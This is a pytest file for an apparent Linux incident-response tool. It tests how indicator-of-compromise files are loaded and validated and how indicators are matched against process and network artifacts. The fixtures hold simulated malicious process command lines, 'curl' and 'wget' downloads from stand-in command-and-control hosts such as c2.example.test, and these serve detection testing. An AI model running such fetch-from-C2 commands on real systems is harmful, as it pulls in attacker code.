import json

import pytest

from linux_ir.ioc.matcher import match_iocs
from linux_ir.ioc.schema import Indicator, IocError, load_iocs, normalize


def write(tmp_path, doc, name="i.json"):
    p = tmp_path / name
    p.write_text(json.dumps(doc) if name.endswith(".json") else doc)
    return p


def base(indicators):
    return {"schema_version": 1, "indicators": indicators}


def test_valid_load_normalises_and_dedupes(tmp_path):
    h = "A" * 64
    p = write(
        tmp_path,
        base(
            [
                {"type": "sha256", "value": h},
                {"type": "sha256", "value": h.lower()},
                {"type": "domain", "value": "EVIL.Example.Test."},
                {"type": "ip", "value": "2001:DB8:0:0:0:0:0:1"},
                {"type": "file_path", "value": "/tmp//x/"},
            ]
        ),
    )
    meta, inds, warns = load_iocs(p)
    assert [i.value for i in inds] == ["a" * 64, "evil.example.test", "2001:db8::1", "/tmp/x"]
    assert any("duplicate" in w for w in warns) and meta["indicator_count"] == 4


@pytest.mark.parametrize(
    "ind",
    [
        {"type": "sha256", "value": "abc"},
        {"type": "ip", "value": "999.1.1.1"},
        {"type": "domain", "value": "nodots"},
        {"type": "file_path", "value": "relative/path"},
        {"type": "file_path", "value": "/a/../b"},
        {"type": "process_name", "value": "/bin/ls"},
        {"type": "url", "value": "x"},
        {"type": "ip"},
        {"type": "ip", "value": "1.1.1.1", "severity": "urgent"},
        {"type": "ip", "value": "1.1.1.1", "extra": 1},
        "str",
    ],
)
def test_invalid_indicator_rejected(tmp_path, ind):
    with pytest.raises(IocError):
        load_iocs(write(tmp_path, base([ind])))


def test_invalid_documents(tmp_path):
    for doc in (
        [],
        {"schema_version": 2, "indicators": []},
        {"schema_version": 1},
        {"schema_version": 1, "indicators": [], "x": 1},
    ):
        with pytest.raises(IocError):
            load_iocs(write(tmp_path, doc))
    bad = tmp_path / "bad.json"
    bad.write_text("{not json")
    with pytest.raises(IocError):
        load_iocs(bad)
    with pytest.raises(IocError):
        load_iocs(tmp_path / "missing.json")


def test_yaml_ioc_file(tmp_path):
    p = write(tmp_path, "schema_version: 1\nindicators:\n  - {type: ip, value: 192.0.2.1}\n", "i.yaml")
    assert load_iocs(p)[1][0].value == "192.0.2.1"


def test_normalize_case_insensitive_paths():
    assert normalize("file_path", "/Applications/Evil.APP", True) == "/applications/evil.app"


ARTS = {
    "processes": {
        "records": [
            {
                "pid": 1,
                "name": "evil",
                "exe": "/tmp/evil",
                "exe_sha256": "a" * 64,
                "cmdline": ["curl", "http://c2.example.test/x", "-o", "198.51.100.9"],
            }
        ]
    },
    "network": {
        "records": [{"kind": "socket", "remote_addr": "203.0.113.5", "local_addr": "10.0.0.1", "process": "evil"}]
    },
}


def inds(*items):
    return [Indicator(t, v, "high", "", "src") for t, v in items]


def test_exact_matching_all_types():
    f = match_iocs(
        ARTS,
        inds(
            ("sha256", "a" * 64),
            ("process_name", "evil"),
            ("file_path", "/tmp/evil"),
            ("ip", "203.0.113.5"),
            ("ip", "198.51.100.9"),
            ("domain", "c2.example.test"),
        ),
    )
    kinds = {x.rule_id for x in f}
    assert kinds == {
        "IOC-MATCH-SHA256",
        "IOC-MATCH-PROCESS_NAME",
        "IOC-MATCH-FILE_PATH",
        "IOC-MATCH-IP",
        "IOC-MATCH-DOMAIN",
    }
    assert all(x.classification == "ioc_match" and x.evidence_ref.startswith("artifacts/") for x in f)
    assert all("not" in " ".join(x.next_steps).lower() for x in f)  # states match != compromise


def test_no_substring_matching_by_default():
    f = match_iocs(
        ARTS, inds(("process_name", "evi"), ("file_path", "/tmp"), ("domain", "example.test"), ("ip", "203.0.113.50"))
    )
    assert f == []


def test_subdomain_matching_is_opt_in():
    arts = {"processes": {"records": [{"cmdline": ["wget http://a.b.evil.example.test/x"]}]}}
    assert match_iocs(arts, inds(("domain", "evil.example.test"))) == []
    assert len(match_iocs(arts, inds(("domain", "evil.example.test")), match_subdomains=True)) == 1


def test_empty_evidence_and_unknown_artifacts():
    assert match_iocs({}, inds(("ip", "1.1.1.1"))) == []
    assert match_iocs({"weird": {"records": [{"x": 1}]}}, inds(("ip", "1.1.1.1"))) == []
